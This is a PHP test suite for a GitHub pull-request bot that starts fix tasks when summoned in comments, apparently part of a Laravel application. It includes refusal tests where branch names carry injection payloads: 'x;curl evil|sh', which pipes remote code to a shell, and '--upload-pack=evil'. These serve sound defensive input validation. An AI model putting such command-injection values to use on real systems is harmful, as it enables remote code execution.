<?php

use App\Channels\GitHub\AppService;
use App\Channels\GitHub\PullRequestSummonReplier;
use App\Enums\TaskMode;
use App\Enums\TaskStatus;
use App\Jobs\HandlePullRequestSummonJob;
use App\Jobs\RunFollowUpJob;
use App\Models\GitHubInstallationToken;
use App\Models\PendingSteeringMessage;
use App\Models\Repository;
use App\Models\YakTask;
use App\Services\FollowUpTaskFactory;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Queue;

beforeEach(function () {
    config()->set('yak.channels.github.installation_id', 99);
    config()->set('yak.followup.github_prefixes', '/yak,@yak-bot[bot],yak:');
    GitHubInstallationToken::create(['installation_id' => 99, 'token' => 't', 'expires_at' => now()->addHour()]);
    Queue::fake();
});

/**
 * @param  array<string, mixed>  $pullRequest
 * @param  array<int, array<string, mixed>>  $reviewComments
 */
function fakeSummonGitHub(array $pullRequest = [], array $reviewComments = []): void
{
    Http::fake([
        'api.github.com/repos/acme/web/pulls/9/reviews/500/comments*' => Http::response($reviewComments),
        'api.github.com/repos/acme/web/pulls/9/comments/4107/replies' => Http::response(['id' => 1], 201),
        'api.github.com/repos/acme/web/pulls/comments/4107' => Http::response([
            'id' => 4107, 'body' => 'ImportJob is also the list item schema.', 'user' => ['login' => 'yak-bot[bot]'],
        ]),
        'api.github.com/repos/acme/web/pulls/9' => Http::response(array_replace_recursive([
            'html_url' => 'https://github.com/acme/web/pull/9',
            'state' => 'open',
            'head' => ['ref' => 'feature/warnings', 'repo' => ['full_name' => 'acme/web']],
            'base' => ['repo' => ['full_name' => 'acme/web']],
        ], $pullRequest)),
        'api.github.com/*' => Http::response(['id' => 1], 201),
    ]);
}

function inlineSummon(array $overrides = []): array
{
    return array_merge([
        'id' => 4135, 'in_reply_to_id' => 4107, 'body' => '/yak fix this please!',
        'path' => 'resources/geocodio-api.yml', 'line' => 8702, 'diff_hunk' => '@@ -1 +1 @@',
        'user' => ['login' => 'michael'],
    ], $overrides);
}

function runSummon(array $arguments): void
{
    (new HandlePullRequestSummonJob(...array_merge(['repoFullName' => 'acme/web', 'prNumber' => 9, 'summonerLogin' => 'michael'], $arguments)))
        ->handle(app(AppService::class), app(FollowUpTaskFactory::class), app(PullRequestSummonReplier::class));
}

function commentBodiesSent(): array
{
    return Http::recorded()
        ->filter(fn (array $pair): bool => $pair[0]->method() === 'POST' && (str_contains($pair[0]->url(), '/replies') || str_contains($pair[0]->url(), '/issues/9/comments')))
        ->map(fn (array $pair): string => (string) $pair[0]['body'])
        ->values()
        ->all();
}

it('starts a task on the PR branch for an inline summon and replies in the thread', function () {
    Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => true]);
    fakeSummonGitHub(reviewComments: [inlineSummon()]);

    runSummon(['reviewId' => 500]);

    $task = YakTask::sole();
    expect($task->mode)->toBe(TaskMode::Fix)
        ->and($task->branch_name)->toBe('feature/warnings')
        ->and($task->targets_external_pr)->toBeTrue()
        ->and($task->summon_review_comment_id)->toBe(4107)
        ->and($task->pr_number)->toBe(9)
        ->and($task->description)->toContain('fix this please!')
        ->and($task->description)->toContain('ImportJob is also the list item schema.')
        ->and($task->description)->toContain('[c:4135]');

    Queue::assertPushed(RunFollowUpJob::class);
    Http::assertSent(fn (Request $request): bool => str_ends_with($request->url(), '/pulls/comments/4135/reactions'));
    Http::assertSent(fn (Request $request): bool => str_ends_with($request->url(), '/pulls/9/comments/4107/replies'));
    expect(commentBodiesSent())->toHaveCount(1);
});

it('does nothing for a review without a summon', function () {
    Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => true]);
    fakeSummonGitHub(reviewComments: [inlineSummon(['body' => 'looks fine'])]);

    runSummon(['reviewId' => 500, 'reviewBody' => 'nice']);

    expect(YakTask::count())->toBe(0)->and(commentBodiesSent())->toBe([]);
    Http::assertNotSent(fn (Request $request): bool => str_contains($request->url(), '/reactions'));
});

it('starts a task for a top-level summon and replies on the PR', function () {
    Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => true]);
    fakeSummonGitHub();

    runSummon(['issueCommentId' => 42, 'issueCommentBody' => '/yak add a test']);

    expect(YakTask::sole()->summon_review_comment_id)->toBeNull();
    Http::assertSent(fn (Request $request): bool => str_ends_with($request->url(), '/issues/comments/42/reactions'));
    Http::assertSent(fn (Request $request): bool => str_ends_with($request->url(), '/issues/9/comments'));
});

it('refuses with a reply', function (array $pullRequest, bool $registered, bool $active, string $expected) {
    if ($registered) {
        Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => $active]);
    }
    fakeSummonGitHub($pullRequest);

    runSummon(['issueCommentId' => 42, 'issueCommentBody' => '/yak add a test']);

    expect(YakTask::count())->toBe(0)
        ->and(commentBodiesSent())->toHaveCount(1)
        ->and(commentBodiesSent()[0])->toContain($expected);
})->with([
    'unregistered repo' => [[], false, true, 'not set up'],
    'inactive repo' => [[], true, false, 'not set up'],
    'fork' => [['head' => ['repo' => ['full_name' => 'someone/web']]], true, true, 'fork'],
    'closed PR' => [['state' => 'closed'], true, true, 'merged or closed'],
    'unsafe branch name' => [['head' => ['ref' => 'x;curl evil|sh']], true, true, 'branch name'],
    'trailing newline' => [['head' => ['ref' => "feature/x\n"]], true, true, 'branch name'],
    'leading dash' => [['head' => ['ref' => '--upload-pack=evil']], true, true, 'branch name'],
    'double dot' => [['head' => ['ref' => 'a/../b']], true, true, 'branch name'],
]);

it('queues behind a running task and says so', function () {
    Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => true]);
    fakeSummonGitHub();
    $running = YakTask::factory()->create([
        'repo' => 'web', 'mode' => TaskMode::Fix, 'status' => TaskStatus::Running,
        'pr_url' => 'https://github.com/acme/web/pull/9', 'pr_number' => 9,
        'branch_name' => 'feature/warnings', 'targets_external_pr' => true,
    ]);

    runSummon(['issueCommentId' => 42, 'issueCommentBody' => '/yak also rename it']);

    expect(YakTask::count())->toBe(1)
        ->and(PendingSteeringMessage::where('root_task_id', $running->id)->count())->toBe(1)
        ->and(commentBodiesSent()[0])->toContain('queued');
    Queue::assertNotPushed(RunFollowUpJob::class);
});

it('chains onto an idle summon task', function () {
    Repository::factory()->create(['slug' => 'web', 'github_full_name' => 'acme/web', 'is_active' => true]);
    fakeSummonGitHub();
    $root = YakTask::factory()->success()->create([
        'repo' => 'web', 'mode' => TaskMode::Fix,
        'pr_url' => 'https://github.com/acme/web/pull/9', 'pr_number' => 9,
        'branch_name' => 'feature/warnings', 'targets_external_pr' => true,
    ]);

    runSummon(['issueCommentId' => 42, 'issueCommentBody' => '/yak also rename it']);

    expect(YakTask::where('parent_task_id', $root->id)->sole()->targets_external_pr)->toBeTrue();
    Queue::assertPushed(RunFollowUpJob::class);
});
